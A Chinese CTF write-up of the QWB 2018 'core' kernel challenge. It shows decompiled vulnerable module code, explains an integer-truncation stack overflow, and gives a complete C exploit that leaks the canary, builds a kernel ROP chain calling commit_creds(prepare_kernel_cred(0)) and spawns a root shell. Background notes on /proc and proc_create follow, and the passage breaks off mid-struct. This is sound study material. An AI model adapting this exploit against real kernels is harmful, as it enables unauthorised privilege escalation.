<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">QWB2018_core [master●●] cat exploit.c </span><br><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="延拓1"><a href="#延拓1" class="headerlink" title="延拓1"></a>延拓1</h2><p>在这道例题中可以看到模块在初始化函数中主要是调用proc_create函数</p>
<p>要了解这个函数首先先了解一下/proc文件系统</p>
<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><blockquote>
<p>在许多类 Unix计算机系统中,<strong>procfs</strong> 是 进程文件系统(process file system) 的缩写,包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> 目录。由于 <code>/proc</code> <strong>不是一个真正的文件系统</strong>，它也就不占用存储空间，只是占用有限的内存。</p>
</blockquote>
<p><strong>创建一个 proc 虚拟文件，应用层通过读写该文件，即可实现与内核的交互。</strong></p>
<p>Linux中每个正在运行的进程对应于<code>/proc</code>下的一个目录，目录名就是进程的PID，每个目录包含:</p>
<ul>
<li>/proc/PID/cmdline, 启动该进程的命令行.</li>
<li>/proc/PID/cwd, 当前工作目录的符号链接</li>
<li>/proc/PID/environ 影响进程的环境变量的名字和值.</li>
<li>/proc/PID/exe, 最初的可执行文件的符号链接, 如果它还存在的话。</li>
<li>/proc/PID/fd, 一个目录，包含每个打开的文件描述符的符号链接.</li>
<li>/proc/PID/fdinfo, 一个目录，包含每个打开的文件描述符的位置和标记</li>
<li>/proc/PID/maps, 一个文本文件包含内存映射文件与块的信息。</li>
<li>/proc/PID/mem, 一个二进制图像(image)表示进程的虚拟内存, 只能通过ptrace化进程访问.</li>
<li>/proc/PID/root, 该进程所能看到的根路径的符号链接。如果没有chroot监狱，那么进程的根路径是/.</li>
<li>/proc/PID/status包含了进程的基本信息，包括运行状态、内存使用。</li>
<li>/proc/PID/task, 一个目录包含了硬链接到该进程启动的任何任务</li>
</ul>
<p>用户可以获得PID使用工具如pgrep, pidof或ps:</p>
<h3 id="伪文件系统"><a href="#伪文件系统" class="headerlink" title="伪文件系统"></a>伪文件系统</h3><p>上面提到的伪文件系统又是什么,和普通文件系统有什么不同</p>
<ol>
<li><strong>实现方式</strong>:<ul>
<li><strong>普通文件系统</strong>：通常是针对块设备（硬盘、分区等）或其他<u>存储介质的实际文件系统</u>，例如 ext4、FAT32、NTFS 等。这些文件系统实现了<u>对物理存储介质的管理</u>，包括文件的组织、存储、检索等操作。</li>
<li><strong>伪文件系统</strong>：是在内存中实现的，不涉及对物理存储介质的直接访问。它提供了一种访问内核状态和信息的机制，通过<u>在文件系统层次结构中创建伪文件</u>，用户和进程可以通过文件 I/O 接口来访问和修改内核的状态。</li>
</ul>
</li>
<li><strong>目的</strong>:<ul>
<li><strong>普通文件系统</strong>：主要用于存储和管理用户数据，提供了对数据的持久性存储和检索支持。这些文件系统通常关注于数据的长期保存和管理。</li>
<li><strong>伪文件系统</strong>：用于提供一种用户空间和内核空间之间的通信机制。通过伪文件系统，用户可以访问内核中的信息，例如系统状态、进程信息、设备信息等。这样的文件系统并非用于长期存储数据，而是用于提供一个接口来查询和配置内核状态。</li>
</ul>
</li>
<li><strong>位置</strong>:<ul>
<li><strong>普通文件系统</strong>：存储在物理存储介质上，例如硬盘、SSD 等。</li>
<li><strong>伪文件系统</strong>：存储在内存中，通常在 <code>/proc</code> 和 <code>/sys</code> 目录下，用于让用户和进程通过文件接口与内核进行通信。</li>
</ul>
</li>
</ol>
<p>经典的伪文件系统包括 <code>/proc</code> 和 <code>/sys</code>：</p>
<ul>
<li><code>/proc</code> 提供了对系统和进程信息的访问，例如 <code>/proc/cpuinfo</code> 可以查看 CPU 信息，<code>/proc/meminfo</code> 可以查看内存信息。</li>
<li><code>/sys</code> 则提供了对内核和设备参数的访问，例如 <code>/sys/class/gpio</code> 可以用于控制 GPIO。</li>
</ul>
<p>特别的伪文件系统只存在于内存中,不存在于硬盘中</p>
<h3 id="proc-create"><a href="#proc-create" class="headerlink" title="proc_create"></a>proc_create</h3><p>例题中使用了proc_create函数和remove_proc_entry</p>
<p>着重研究一下前者,毕竟后者想来是前者的逆操作</p>
<p>源码在内核<code>/fs/proc/generic.c</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">				   <span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">				   <span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> proc_create_data(name, mode, parent, proc_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create);</span><br></pre></td></tr></table></figure>
<p>四个参数分别是</p>
<ol>
<li><code>name</code>,要创建的文件夹的名字</li>
<li><code>mode</code>,创建的文件夹的权限模式,<u>八进制</u>下的UGO模式</li>
<li><code>parent</code>,要创建节点的父节点,也就是要在哪个文件夹之下创建新文件夹，需要将那个文件夹的 proc_dir_entry 传入。如果直接在/proc/目录下则不需要</li>
<li><code>proc_ops</code>该文件的操作函数</li>
</ol>
<hr>
<p>其中还涉及到两个结构体proc_dir_entry和proc_ops</p>
<p>proc_ops是一个用于存放要注册的函数指针的结构体,之后对打开的设备文件调用对应函数便会指向这些函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> proc_flags;</span><br><span class="line">	<span class="type">int</span>	(*proc_open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">ssize_t</span>	(*proc_read)(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*proc_read_iter)(<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">ssize_t</span>	(*proc_write)(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="comment">/* mandatory unless nonseekable_open() or equivalent is used */</span></span><br><span class="line">	<span class="type">loff_t</span>	(*proc_lseek)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span>	(*proc_release)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">__poll_t</span> (*proc_poll)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line">	<span class="type">long</span>	(*proc_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span 